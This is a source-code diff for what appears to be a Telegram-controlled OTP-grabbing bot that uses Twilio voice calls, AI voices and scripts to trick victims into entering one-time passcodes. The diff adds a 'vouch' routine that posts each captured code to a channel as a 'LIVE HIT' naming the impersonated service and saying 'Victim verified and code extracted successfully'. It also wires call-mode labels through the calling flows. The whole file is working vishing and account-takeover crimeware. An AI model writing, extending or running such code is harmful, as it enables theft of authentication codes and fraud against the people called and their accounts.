@@ -179,6 +179,8 @@ LIVE_LISTEN_SECRET = _get("LIVE_LISTEN_SECRET", "")
 DISABLE_TWILIO_VALIDATION = _get("DISABLE_TWILIO_VALIDATION", "false").lower() in ("true", "1", "yes")
 # Disable DummyBot fallback in production or when explicitly requested
 DISABLE_DUMMY_BOT = _get("DISABLE_DUMMY_BOT", "false").lower() in ("true", "1", "yes")
+# Vouches channel for live hit posts
+VOUCH_CHANNEL_ID = _get("VOUCH_CHANNEL_ID", "")
 # Abstract API (carrier lookup)
 ABSTRACT_API_KEY = _get("ABSTRACT_API_KEY", "")
 # Rate limiter
@@ -1359,6 +1361,7 @@ def register_call_session(
     user_id: str,
     chat_id: Optional[int] = None,
     endpoint: Optional[str] = None,
+    mode_label: Optional[str] = None,
     voice_id: Optional[str] = None,
     voice_name: Optional[str] = None,
     status_chat_id: Optional[int] = None,
@@ -1377,6 +1380,7 @@ def register_call_session(
             "answered_by": None,
             "voice_id": voice_id,
             "voice_name": voice_name,
+            "mode_label": mode_label,
             "endpoints_hit": [endpoint] if endpoint else [],
             "status_chat_id": status_chat_id if status_chat_id is not None else chat_id,
             "status_message_id": status_message_id,
@@ -1392,6 +1396,8 @@ def register_call_session(
         session["status_chat_id"] = status_chat_id
     if status_message_id is not None:
         session["status_message_id"] = status_message_id
+    if mode_label is not None:
+        session["mode_label"] = mode_label
     if endpoint and endpoint not in session.get("endpoints_hit", []):
         session["endpoints_hit"].append(endpoint)
 
@@ -1548,6 +1554,76 @@ def send_call_stage_status(chat_id, stage, text):
         bot.send_message(chat_id, f"ℹ️ {text}")
     except Exception as e:
         logger.debug(f"Failed to send call stage status: {e}")
+
+
+def _resolve_vouch_mode(session: Optional[dict]) -> str:
+    if not session:
+        return "Unknown"
+    mode_label = session.get("mode_label")
+    if mode_label:
+        return mode_label
+    campaign = session.get("campaign")
+    if campaign and str(campaign).upper() == "CRACK BLAST":
+        return "Crack Blast"
+    endpoints = [str(endpoint).lower() for endpoint in session.get("endpoints_hit", []) if endpoint]
+    if "/custom_flow" in endpoints:
+        return "Custom Call"
+    if "/manual_flow" in endpoints:
+        return "Manual Calling"
+    if "/focus_listen_flow" in endpoints and "/normal_advanced_flow" in endpoints:
+        return "Normal Call"
+    if "/focus_listen_flow" in endpoints:
+        return "Fast Mode"
+    if "/normal_advanced_flow" in endpoints:
+        return "Normal Call"
+    if "/voice" in endpoints:
+        return "AI Mode"
+    if "/initiate_normal_call" in endpoints:
+        return "Normal Call"
+    return "Unknown"
+
+
+def post_vouch_to_channel(call_sid: str, user_id: str, otp: str, override_service: Optional[str] = None, override_mode: Optional[str] = None) -> bool:
+    channel = VOUCH_CHANNEL_ID.strip()
+    if not channel:
+        logger.debug("VOUCH_CHANNEL_ID not set; skipping vouch post.")
+        return False
+
+    service_name = override_service or read_user_file(user_id, "Company Name.txt", "")
+    if not service_name or service_name.strip().lower() in ("", "your company", "unknown service"):
+        service_name = read_user_file(user_id, "Name.txt", "Unknown Service")
+    service_name = service_name.strip() or "Unknown Service"
+
+    mode = override_mode or _resolve_vouch_mode(call_sessions.get(call_sid))
+    hit_id = uuid.uuid4().hex[:4].upper()
+    now = datetime.utcnow()
+    time_str = now.strftime("%H:%M UTC")
+    date_str = now.strftime("%d/%m/%Y")
+
+    message = (
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"🎯 LIVE HIT #HTZ-{hit_id}\n"
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"👤 TARGET: {html.escape(service_name)}\n"
+        f"🤖 MODE: {html.escape(mode)}\n"
+        f"📱 STATUS: ✅ CODE CRACKED\n"
+        f"🔑 OTP: {html.escape(otp)}\n"
+        f"⏱️ CAPTURED: {time_str}\n"
+        f"📅 DATE: {date_str}\n\n"
+        f'💬 "Victim verified and code extracted successfully."\n'
+        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
+        f"⚡ Access The Bot @Hittz_OTPbot"
+    )
+
+    try:
+        target_chat = int(channel) if re.fullmatch(r"-?\d+", channel) else channel
+        bot.send_message(target_chat, message, parse_mode="HTML", disable_web_page_preview=True)
+        logger.info(f"✅ Vouch posted for OTP {otp} (Hit #{hit_id})")
+        return True
+    except Exception as e:
+        logger.error(f"❌ Failed to post vouch: {e}")
+        return False
+
 
 def log_otp(call_sid, digits, status):
     """Log OTP to file for audit."""
@@ -2175,13 +2251,15 @@ def _load_scheduled_params(user_id: str, schedule_id: str) -> Optional[dict]:
     return None
 
 
-def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_message_id: Optional[int] = None) -> None:
+def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_message_id: Optional[int] = None, mode_label: Optional[str] = None) -> None:
     """Start a Normal Call that always uses the single ultimate script endpoints.
 
     Creates a Twilio call whose webhook points to `/focus_listen_flow` which
     records briefly then redirects into `/normal_advanced_flow` so the single
     ultimate script is used for all normal calls.
     """
+    if mode_label is None:
+        mode_label = "Normal Call"
     try:
         # Decrement free trial for non-premium users before making the call
         if not is_premium_user(user_id_str):
@@ -2254,6 +2332,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                         user_id_str,
                         chat_id=chat_id,
                         endpoint="/initiate_normal_call",
+                        mode_label=mode_label,
                         status_chat_id=chat_id,
                         status_message_id=status_message_id,
                     )
@@ -2284,6 +2363,7 @@ def initiate_normal_call(chat_id: int, user_id_str: str, call_from_user, status_
                                         user_id_str,
                                         chat_id=chat_id,
                                         endpoint="/initiate_normal_call",
+                                        mode_label=mode_label,
                                         status_chat_id=chat_id,
                                         status_message_id=status_message_id,
                                     )
@@ -2721,6 +2801,7 @@ def voice():
     chat_id_str = request.values.get("chat_id") or request.args.get("chat_id")
     custom_mode = request.values.get("custom") == "1"
     audio_key = request.values.get("audio") or request.args.get("audio")
+    emotion = request.values.get("emotion") or request.args.get("emotion")
     chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
 
     logger.info(f"[VOICE] Call {call_sid[:8] if call_sid else 'unknown'} for user {user_id}")
@@ -2731,7 +2812,7 @@ def voice():
         custom_delay = read_user_file(user_id, "custom_delay.txt", "0").strip() or "0"
         custom_fallback = read_user_file(user_id, "custom_fallback.txt", "").strip()
         custom_digits = read_user_file(user_id, "custom_digits.txt", "0").strip() or "0"
-        register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/voice(custom_script)")
+        register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/voice(custom_script)", mode_label="Custom Call")
         return custom_flow_response(
             user_id=user_id,
             chat_id=chat_id,
@@ -2741,6 +2822,7 @@ def voice():
             delay=custom_delay,
             fallback=custom_fallback,
             digits=custom_digits,
+            audio_key=audio_key,
         )
 
     name = "there"
@@ -2757,11 +2839,13 @@ def voice():
             voice_id = saved_id
             voice_name = saved_name or "Custom"
 
+    mode_label = "AI Emotion Call" if emotion else "AI Mode"
     register_call_session(
         call_sid,
         user_id,
         chat_id=chat_id,
         endpoint="/voice",
+        mode_label=mode_label,
         voice_id=voice_id,
         voice_name=voice_name,
     )
@@ -2802,7 +2886,7 @@ def manual_flow():
     call_sid = request.values.get("CallSid", "")
     chat_id = int(chat_id_str) if chat_id_str and chat_id_str not in ("None", "unknown") else None
 
-    register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/manual_flow")
+    register_call_session(call_sid, user_id, chat_id=chat_id, endpoint="/manual_flow", mode_label="Manual Calling")
 
     if schedule_id and user_id != "unknown":
         scheduled = _load_scheduled_params(user_id, schedule_id)
@@ -2887,7 +2971,7 @@ def manual_flow():
     return Response(str(resp), content_type="application/xml")
 
 
-def custom_flow_response(user_id: str, chat_id: Optional[int], call_sid: str, script: Optional[str] = None, voice_id: Optional[str] = None, delay: str = "0", fallback: str = "", digits: str = "0") -> Response:
+def custom_flow_response(user_id: str, chat_id: Optional[int], call_sid: str, script: Optional[str] = None, voice_id: Optional[str] = None, delay: str = "0", fallback: str = "", digits: str = "0", audio_key: Optional[str] = None) -> Response:
     script = (script or read_user_file(user_id, "custom_script.txt", "")).strip()
     voice_id = str(voice_id or "").strip() or resolve_voice_id(user_id, "custom_voice_id.txt")
     voice_name = read_user_file(user_id, "VoiceName.txt", "") or ""
@@ -2895,11 +2979,13 @@ def custom_flow_response(user_id: str, chat_id: Optional[int], call_sid: str, sc
         voice_key = get_voice_key_by_id(voice_id)
         if voice_key:
             voice_name = VOICE_MAPPING.get(voice_key, {}).get("name", "")
+    mode_label = "Crack Blast" if audio_key == "crack_script" else "Custom Call"
     register_call_session(
         call_sid,
         user_id,
         chat_id=chat_id,
         endpoint="/custom_flow",
+        mode_label=mode_label,
         voice_id=voice_id,
         voice_name=voice_name,
     )
@@ -3074,7 +3160,7 @@ def custom_flow():
         fallback = crack_config.get("fallback", "") or ""
         digits = crack_config.get("digits", "0") or "0"
 
-    response = custom_flow_response(user_id=user_id, chat_id=chat_id, call_sid=request.values.get("CallSid", ""), script=script, voice_id=voice_id, delay=delay, fallback=fallback, digits=digits)
+    response = custom_flow_response(user_id=user_id, chat_id=chat_id, call_sid=request.values.get("CallSid", ""), script=script, voice_id=voice_id, delay=delay, fallback=fallback, digits=digits, audio_key=audio_key)
     return response
 
 
@@ -3364,6 +3450,10 @@ def capture_otp():
                     return
                 try:
                     session["otp_status"] = "auto_accepted"
+                    if digits:
+                        def _post_vouch_auto():
+                            post_vouch_to_channel(call_sid, session.get("user_id") or user_id, digits, override_mode="Auto Accept")
+                        threading.Thread(target=_post_vouch_auto, daemon=True).start()
                     resp_auto = VoiceResponse()
                     say_auto = "Verification successful. Thank you. Goodbye."
                     audio_auto = generate_call_audio(user_id=user_id, text=say_auto, voice_id=voice_id, filename="otp_auto_accept.mp3")
@@ -4358,7 +4448,7 @@ def _handle_query_processing(call, _):
                 except:
                     pass
 
-        run_callback_async(_setup_custom_call)
+        _setup_custom_call()
         return
 
     if call.data == "custom_call_preview_audio":
@@ -4564,8 +4654,14 @@ def _handle_query_processing(call, _):
             status_message_id = getattr(status_message, 'message_id', None)
         except Exception:
             pass
+        call_mode_label = read_user_file(user_id_str, "call_mode_label.txt", "").strip() or "Normal Call"
+        if call_mode_label:
+            try:
+                (user_conf_path(user_id_str) / "call_mode_label.txt").unlink()
+            except Exception:
+                pass
         # Use the single ultimate Normal Call flow (always use /normal_advanced_flow)
-        run_callback_async(initiate_normal_call, chat_id, user_id_str, call.from_user, status_message_id)
+        run_callback_async(initiate_normal_call, chat_id, user_id_str, call.from_user, status_message_id, mode_label=call_mode_label)
         return
 
     # --- Initiate custom call ---
@@ -4944,6 +5040,11 @@ def _handle_query_processing(call, _):
         if session is not None:
             session["otp_status"] = "accepted"
         target_user_id = session.get("user_id") if session else user_id_str
+
+        def _post_vouch():
+            post_vouch_to_channel(call_sid, target_user_id, digits)
+        threading.Thread(target=_post_vouch, daemon=True).start()
+
         voice_id_accept, _ = get_call_voice_info(call_sid, target_user_id)
         try:
             client = twilio_client or get_twilio_client()
@@ -5675,6 +5776,7 @@ def handle_stateful_text(message):
         buttons = types.InlineKeyboardMarkup(row_width=2)
         buttons.add(types.InlineKeyboardButton("📞 INITIATE CALL", callback_data="normal_confirm"))
         buttons.add(types.InlineKeyboardButton("❌ CANCEL", callback_data="cancel_call"))
+        write_user_file(user_id_str, "call_mode_label.txt", "Fast Mode")
         bot.send_message(message.chat.id, summary, reply_markup=buttons)
         return
 
